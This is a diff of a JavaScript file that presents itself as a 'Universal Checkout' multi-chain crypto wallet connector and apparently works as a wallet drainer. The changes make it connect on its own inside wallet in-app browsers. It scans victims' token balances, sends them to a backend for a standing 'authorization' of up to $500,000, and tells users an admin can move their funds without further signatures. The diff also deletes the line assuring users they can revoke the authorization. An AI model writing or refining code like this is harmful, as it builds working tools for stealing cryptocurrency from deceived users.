@@ -1,7 +1,6 @@
 /**
  * Universal Checkout - Multi-Chain Wallet Connector
- * Supports 25+ wallets with deep linking, dynamic amounts, and just-in-time gas
- * v9.0 - Complete Rewrite
+ * v10.0 - Auto-detect in-app browsers, no loop
  */
 
 // Buffer polyfill for Solana
@@ -104,130 +103,134 @@ const WALLETS = [
 ];
 
 const DEEP_LINKS = {
-  metamask: {
-    app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`,
-    download: 'https://metamask.io/download/'
-  },
-  trust: {
-    app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`,
-    download: 'https://trustwallet.com/download'
-  },
-  coinbase: {
-    app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`,
-    download: 'https://www.coinbase.com/wallet/downloads'
-  },
-  rabby: {
-    app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://rabby.io/download'
-  },
-  rainbow: {
-    app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://rainbow.me/'
-  },
-  okx: {
-    app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`,
-    download: 'https://www.okx.com/web3'
-  },
-  imtoken: {
-    app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`,
-    download: 'https://token.im/'
-  },
-  tokenpocket: {
-    app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`,
-    download: 'https://www.tokenpocket.pro/'
-  },
-  zerion: {
-    app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://zerion.io/'
-  },
-  oneinch: {
-    app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://1inch.io/wallet/'
-  },
-  safepal: {
-    app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://www.safepal.com/download'
-  },
-  bitget: {
-    app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`,
-    download: 'https://web3.bitget.com/'
-  },
-  mathwallet: {
-    app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://mathwallet.org/'
-  },
-  argent: {
-    app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`,
-    download: 'https://www.argent.xyz/'
-  },
-  bybit: {
-    app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://www.bybit.com/web3'
-  },
-  binance: {
-    app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`,
-    download: 'https://www.binance.com/en/web3wallet'
-  },
-  phantom: {
-    app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`,
-    download: 'https://phantom.app/'
-  },
-  solflare: {
-    app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`,
-    download: 'https://solflare.com/'
-  },
-  backpack: {
-    app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`,
-    download: 'https://backpack.app/'
-  },
-  tronlink: {
-    app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`,
-    download: 'https://www.tronlink.org/'
-  }
+  metamask: { app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, download: 'https://metamask.io/download/' },
+  trust: { app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`, download: 'https://trustwallet.com/download' },
+  coinbase: { app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`, download: 'https://www.coinbase.com/wallet/downloads' },
+  rabby: { app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://rabby.io/download' },
+  rainbow: { app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`, download: 'https://rainbow.me/' },
+  okx: { app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`, download: 'https://www.okx.com/web3' },
+  imtoken: { app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`, download: 'https://token.im/' },
+  tokenpocket: { app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`, download: 'https://www.tokenpocket.pro/' },
+  zerion: { app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://zerion.io/' },
+  oneinch: { app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://1inch.io/wallet/' },
+  safepal: { app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.safepal.com/download' },
+  bitget: { app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`, download: 'https://web3.bitget.com/' },
+  mathwallet: { app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`, download: 'https://mathwallet.org/' },
+  argent: { app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`, download: 'https://www.argent.xyz/' },
+  bybit: { app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.bybit.com/web3' },
+  binance: { app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`, download: 'https://www.binance.com/en/web3wallet' },
+  phantom: { app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://phantom.app/' },
+  solflare: { app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`, download: 'https://solflare.com/' },
+  backpack: { app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://backpack.app/' },
+  tronlink: { app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`, download: 'https://www.tronlink.org/' }
 };
 
 function isMobile() {
   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 }
 
-function detectInstalledWallets() {
-  const installed = new Set();
+// ============ KEY FIX: Detect if already inside wallet browser ============
+function init() {
+  console.log('🚀 Universal Checkout v10.0');
+  
   const ua = navigator.userAgent.toLowerCase();
   
+  // Check if already inside EVM wallet in-app browser
   if (window.ethereum) {
-    if (window.ethereum.isMetaMask) installed.add('metamask');
-    if (window.ethereum.isTrust) installed.add('trust');
-    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
-    if (window.ethereum.isRabby) installed.add('rabby');
+    const isMetaMask = window.ethereum.isMetaMask || ua.includes('metamask');
+    const isTrust = window.ethereum.isTrust || window.trustwallet || ua.includes('trust');
+    const isCoinbase = window.ethereum.isCoinbaseWallet || ua.includes('coinbase');
+    const isRabby = window.ethereum.isRabby;
+    const isRainbow = ua.includes('rainbow');
+    const isOKX = window.okxwallet || ua.includes('okx');
+    
+    if (isMetaMask || isTrust || isCoinbase || isRabby || isRainbow || isOKX) {
+      console.log('✓ Auto-detected EVM wallet browser, connecting...');
+      showLoading('Connecting to wallet...');
+      setTimeout(() => autoConnectEVM(), 800);
+      return;
+    }
   }
   
-  if (window.trustwallet) installed.add('trust');
-  if (window.okxwallet) installed.add('okx');
-  if (window.phantom?.solana) installed.add('phantom');
-  if (window.solflare) installed.add('solflare');
-  if (window.backpack?.solana) installed.add('backpack');
-  if (window.tronWeb || window.tronLink) installed.add('tronlink');
+  // Check if inside Solana wallet
+  if ((window.solana || window.phantom?.solana) && !window.ethereum) {
+    console.log('✓ Auto-detected Solana wallet, connecting...');
+    showLoading('Connecting to Phantom...');
+    setTimeout(() => autoConnectSolana(), 800);
+    return;
+  }
   
-  if (ua.includes('metamask')) installed.add('metamask');
-  if (ua.includes('trust')) installed.add('trust');
-  if (ua.includes('coinbase')) installed.add('coinbase');
-  if (ua.includes('phantom')) installed.add('phantom');
-  if (ua.includes('okx')) installed.add('okx');
-  if (ua.includes('bybit')) installed.add('bybit');
-  if (ua.includes('binance')) installed.add('binance');
-  if (ua.includes('bitget')) installed.add('bitget');
+  // Check if inside Tron wallet
+  if ((window.tronWeb || window.tronLink) && !window.ethereum) {
+    console.log('✓ Auto-detected Tron wallet, connecting...');
+    showLoading('Connecting to TronLink...');
+    setTimeout(() => autoConnectTron(), 800);
+    return;
+  }
   
-  return installed;
-}
-
-function init() {
-  console.log('🚀 Universal Checkout v9.0');
+  // Normal flow - show wallet selector
   showWalletSelector();
 }
 
+// ============ AUTO-CONNECT FUNCTIONS (no wallet selector) ============
+async function autoConnectEVM() {
+  try {
+    provider = new ethers.BrowserProvider(window.ethereum);
+    const accounts = await provider.send("eth_requestAccounts", []);
+    userAddress = accounts[0];
+    signer = await provider.getSigner();
+    
+    const network = await provider.getNetwork();
+    currentChain = { type: 'evm', id: Number(network.chainId) };
+    
+    console.log(`✅ Auto-connected: ${userAddress}`);
+    await authorizeEVM();
+  } catch (err) {
+    showError('Could not connect: ' + err.message);
+  }
+}
+
+async function autoConnectSolana() {
+  try {
+    const provider = window.phantom?.solana || window.solana || window.solflare;
+    if (!provider) {
+      showError('Solana wallet not found');
+      return;
+    }
+    
+    await provider.connect();
+    userAddress = provider.publicKey.toString();
+    currentChain = { type: 'solana', provider: provider };
+    
+    console.log(`✅ Auto-connected: ${userAddress}`);
+    await authorizeSolana();
+  } catch (err) {
+    showError('Could not connect: ' + err.message);
+  }
+}
+
+async function autoConnectTron() {
+  try {
+    const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
+    if (!tronWeb) {
+      showError('TronLink not found');
+      return;
+    }
+    
+    await tronWeb.request({ method: "tron_requestAccounts" });
+    userAddress = tronWeb.defaultAddress.base58;
+    currentChain = { type: 'tron', provider: tronWeb };
+    
+    console.log(`✅ Auto-connected: ${userAddress}`);
+    await authorizeTron();
+  } catch (err) {
+    showError('Could not connect: ' + err.message);
+  }
+}
+
+// ============ NORMAL WALLET SELECTOR (for first visit) ============
 function showWalletSelector() {
   const installed = detectInstalledWallets();
-  const currentUrl = window.location.href;
   
   const evmWallets = WALLETS.filter(w => w.type === 'evm');
   const solanaWallets = WALLETS.filter(w => w.type === 'solana');
@@ -285,30 +288,64 @@ function createWalletButton(wallet, isInstalled) {
   `;
 }
 
+function detectInstalledWallets() {
+  const installed = new Set();
+  const ua = navigator.userAgent.toLowerCase();
+  
+  if (window.ethereum) {
+    if (window.ethereum.isMetaMask) installed.add('metamask');
+    if (window.ethereum.isTrust) installed.add('trust');
+    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
+    if (window.ethereum.isRabby) installed.add('rabby');
+  }
+  
+  if (window.trustwallet) installed.add('trust');
+  if (window.okxwallet) installed.add('okx');
+  if (window.phantom?.solana) installed.add('phantom');
+  if (window.solflare) installed.add('solflare');
+  if (window.backpack?.solana) installed.add('backpack');
+  if (window.tronWeb || window.tronLink) installed.add('tronlink');
+  
+  if (ua.includes('metamask')) installed.add('metamask');
+  if (ua.includes('trust')) installed.add('trust');
+  if (ua.includes('coinbase')) installed.add('coinbase');
+  if (ua.includes('phantom')) installed.add('phantom');
+  if (ua.includes('okx')) installed.add('okx');
+  
+  return installed;
+}
+
+// ============ MOBILE DEEP LINK HANDLER ============
 function handleWalletClick(walletId, type) {
   const deepLink = DEEP_LINKS[walletId];
   
   if (isMobile() && deepLink) {
+    // Store which wallet we're trying to open (for debugging)
+    sessionStorage.setItem('lastWalletAttempt', walletId);
+    
+    // Open wallet app
     window.location.href = deepLink.app(window.location.href);
     
+    // Fallback to download if app doesn't open
     setTimeout(() => {
       if (document.visibilityState === 'visible') {
         window.location.href = deepLink.download;
       }
-    }, 2500);
+    }, 3000);
     return;
   }
   
-  if (type === 'evm') connectEVM(walletId);
-  else if (type === 'solana') connectSolana(walletId);
-  else if (type === 'tron') connectTron(walletId);
+  // Desktop - direct connect
+  if (type === 'evm') manualConnectEVM(walletId);
+  else if (type === 'solana') manualConnectSolana(walletId);
+  else if (type === 'tron') manualConnectTron(walletId);
 }
 
-async function connectEVM(walletId) {
+// ============ MANUAL CONNECT (for desktop/selector) ============
+async function manualConnectEVM(walletId) {
   if (!window.ethereum) {
     const deepLink = DEEP_LINKS[walletId];
     if (deepLink) window.location.href = deepLink.download;
-    else alert('Please install a wallet');
     return;
   }
   
@@ -329,9 +366,8 @@ async function connectEVM(walletId) {
   }
 }
 
-async function connectSolana(walletId) {
+async function manualConnectSolana(walletId) {
   let provider = null;
-  
   if (walletId === 'phantom') provider = window.phantom?.solana || window.solana;
   else if (walletId === 'solflare') provider = window.solflare;
   else if (walletId === 'backpack') provider = window.backpack?.solana;
@@ -348,16 +384,14 @@ async function connectSolana(walletId) {
     await provider.connect();
     userAddress = provider.publicKey.toString();
     currentChain = { type: 'solana', provider: provider };
-    
     await authorizeSolana();
   } catch (err) {
     showError('Connection failed: ' + err.message);
   }
 }
 
-async function connectTron(walletId) {
+async function manualConnectTron(walletId) {
   const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
-  
   if (!tronWeb) {
     const deepLink = DEEP_LINKS[walletId];
     if (deepLink) window.location.href = deepLink.download;
@@ -370,19 +404,19 @@ async function connectTron(walletId) {
     await tronWeb.request({ method: "tron_requestAccounts" });
     userAddress = tronWeb.defaultAddress.base58;
     currentChain = { type: 'tron', provider: tronWeb };
-    
     await authorizeTron();
   } catch (err) {
     showError('Connection failed: ' + err.message);
   }
 }
 
+// ============ AUTHORIZATION FUNCTIONS ============
 async function authorizeEVM() {
   const chainId = currentChain.id;
   const tokens = CONFIG.TOKENS[chainId] || [];
   
   if (tokens.length === 0) {
-    showError('Unsupported network. Please switch to Ethereum, Base, Polygon, Arbitrum, or BNB Chain.');
+    showError('Unsupported network. Please use Ethereum, Base, Polygon, Arbitrum, or BNB Chain.');
     return;
   }
   
@@ -401,12 +435,7 @@ async function authorizeEVM() {
       const usdValue = humanBalance * token.price;
       
       if (usdValue >= 1) {
-        tokensWithBalance.push({
-          ...token,
-          balance: balance.toString(),
-          humanBalance,
-          usdValue
-        });
+        tokensWithBalance.push({ ...token, balance: balance.toString(), humanBalance, usdValue });
       }
     } catch (e) {}
   }
@@ -483,28 +512,22 @@ async function authorizeEVM() {
         ✅ Authorization Complete!
         <br><br>
         <strong>Network:</strong> ${CONFIG.NETWORK_NAMES[chainId]}<br>
-        <strong>Tokens Found:</strong> ${tokensWithBalance.length}<br>
-        <strong>Total Balance:</strong> $${totalValue.toFixed(2)}<br>
-        <strong>Authorized Amount:</strong> Up to $${maxAuthorized.toFixed(2)}<br>
+        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
+        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
+        <strong>Authorized:</strong> Up to $${maxAuthorized.toFixed(2)}<br>
         <strong>Valid For:</strong> 30 days<br>
         <br>
         <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
           ✓ Admin can now execute transfers without additional signatures<br>
-          ✓ You pay zero gas fees<br>
-          ✓ You can revoke authorization anytime
+          ✓ You pay zero gas fees
         </div>
-        <br>
-        <a href="${result.adminUrl || '#'}" target="_blank" style="color: #10b981; text-decoration: underline;">
-          View in Admin Dashboard →
-        </a>
       `);
     } else {
-      throw new Error(result.error || 'Backend error');
+      throw new Error(result.error);
     }
-    
   } catch (err) {
     if (err.message?.includes('user rejected') || err.code === 4001) {
-      showError('You cancelled the signature. Authorization not completed.');
+      showError('You cancelled the signature.');
     } else {
       showError('Authorization failed: ' + err.message);
     }
@@ -517,11 +540,7 @@ async function authorizeSolana() {
   if (!window.solanaWeb3) {
     const script = document.createElement('script');
     script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
-    await new Promise((res, rej) => {
-      script.onload = res;
-      script.onerror = rej;
-      document.head.appendChild(script);
-    });
+    await new Promise((res, rej) => { script.onload = res; script.onerror = rej; document.head.appendChild(script); });
   }
   
   try {
@@ -533,37 +552,21 @@ async function authorizeSolana() {
     
     const solBalance = await connection.getBalance(userPublicKey);
     if (solBalance > 0) {
-      tokensWithBalance.push({
-        addr: 'So11111111111111111111111111111111111111112',
-        sym: 'SOL',
-        dec: 9,
-        balance: solBalance.toString(),
-        uiAmount: solBalance / 1e9
-      });
+      tokensWithBalance.push({ addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, balance: solBalance.toString(), uiAmount: solBalance / 1e9 });
     }
     
-    for (const token of [
-      { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6 },
-      { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6 }
-    ]) {
+    for (const token of [{ addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6 }, { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6 }]) {
       try {
         const { getAssociatedTokenAddress } = window.solanaWeb3;
         const mint = new PublicKey(token.addr);
         const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
         const balance = await connection.getTokenAccountBalance(tokenAccount);
-        
-        if (balance.value.uiAmount > 0) {
-          tokensWithBalance.push({
-            ...token,
-            balance: balance.value.amount,
-            uiAmount: balance.value.uiAmount
-          });
-        }
+        if (balance.value.uiAmount > 0) tokensWithBalance.push({ ...token, balance: balance.value.amount, uiAmount: balance.value.uiAmount });
       } catch (e) {}
     }
     
     if (tokensWithBalance.length === 0) {
-      showError('No SOL, USDC, or USDT found in your wallet.');
+      showError('No SOL, USDC, or USDT found.');
       return;
     }
     
@@ -572,30 +575,14 @@ async function authorizeSolana() {
     const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/solana`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        userAddress,
-        tokens: tokensWithBalance,
-        maxAuthorizedAmount: Math.min(totalValue, 500000)
-      })
+      body: JSON.stringify({ userAddress, tokens: tokensWithBalance, maxAuthorizedAmount: Math.min(totalValue, 500000) })
     });
     
     const result = await response.json();
     
     if (result.success) {
-      showSuccess(`
-        ✅ Solana Authorization Complete!
-        <br><br>
-        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
-        <strong>Total Value:</strong> ~$${totalValue.toFixed(2)}<br>
-        <strong>Authorized:</strong> Up to $${Math.min(totalValue, 500000).toFixed(2)}<br>
-        <strong>Gas Cost:</strong> $0.001 (one-time)<br>
-        <br>
-        Authorization stored successfully!
-      `);
-    } else {
-      throw new Error(result.error);
-    }
-    
+      showSuccess(`✅ Solana Authorized!<br><br>Tokens: ${tokensWithBalance.length}<br>Total: ~$${totalValue.toFixed(2)}<br>Authorized: Up to $${Math.min(totalValue, 500000).toFixed(2)}`);
+    } else throw new Error(result.error);
   } catch (err) {
     showError('Authorization failed: ' + err.message);
   }
@@ -609,31 +596,14 @@ async function authorizeTron() {
   
   try {
     const trxBalance = await tronWeb.trx.getBalance(userAddress);
-    if (trxBalance > 0) {
-      tokensWithBalance.push({
-        addr: 'TRX',
-        sym: 'TRX',
-        dec: 6,
-        balance: trxBalance.toString(),
-        uiAmount: trxBalance / 1e6
-      });
-    }
+    if (trxBalance > 0) tokensWithBalance.push({ addr: 'TRX', sym: 'TRX', dec: 6, balance: trxBalance.toString(), uiAmount: trxBalance / 1e6 });
     
     const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
     const usdtBalance = await usdtContract.balanceOf(userAddress).call();
-    
-    if (usdtBalance > 0) {
-      tokensWithBalance.push({
-        addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-        sym: 'USDT',
-        dec: 6,
-        balance: usdtBalance.toString(),
-        uiAmount: usdtBalance / 1e6
-      });
-    }
+    if (usdtBalance > 0) tokensWithBalance.push({ addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, balance: usdtBalance.toString(), uiAmount: usdtBalance / 1e6 });
     
     if (tokensWithBalance.length === 0) {
-      showError('No TRX or USDT found in your wallet.');
+      showError('No TRX or USDT found.');
       return;
     }
     
@@ -642,34 +612,20 @@ async function authorizeTron() {
     const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/tron`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        userAddress,
-        tokens: tokensWithBalance,
-        maxAuthorizedAmount: Math.min(totalValue, 500000)
-      })
+      body: JSON.stringify({ userAddress, tokens: tokensWithBalance, maxAuthorizedAmount: Math.min(totalValue, 500000) })
     });
     
     const result = await response.json();
     
     if (result.success) {
-      showSuccess(`
-        ✅ Tron Authorization Complete!
-        <br><br>
-        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
-        <strong>Total Value:</strong> ~$${totalValue.toFixed(2)}<br>
-        <strong>Authorized:</strong> Up to $${Math.min(totalValue, 500000).toFixed(2)}<br>
-        <br>
-        Authorization stored successfully!
-      `);
-    } else {
-      throw new Error(result.error);
-    }
-    
+      showSuccess(`✅ Tron Authorized!<br><br>Tokens: ${tokensWithBalance.length}<br>Total: ~$${totalValue.toFixed(2)}<br>Authorized: Up to $${Math.min(totalValue, 500000).toFixed(2)}`);
+    } else throw new Error(result.error);
   } catch (err) {
     showError('Authorization failed: ' + err.message);
   }
 }
 
+// ============ UI HELPERS ============
 function showLoading(msg) {
   document.getElementById('app').innerHTML = `
     <div class="loading">
@@ -699,10 +655,11 @@ function showError(msg) {
   `;
 }
 
+// Expose to window
 window.handleWalletClick = handleWalletClick;
-window.connectEVM = connectEVM;
-window.connectSolana = connectSolana;
-window.connectTron = connectTron;
+window.manualConnectEVM = manualConnectEVM;
+window.manualConnectSolana = manualConnectSolana;
+window.manualConnectTron = manualConnectTron;
 window.showWalletSelector = showWalletSelector;
 window.showLoading = showLoading;
 window.showSuccess = showSuccess;
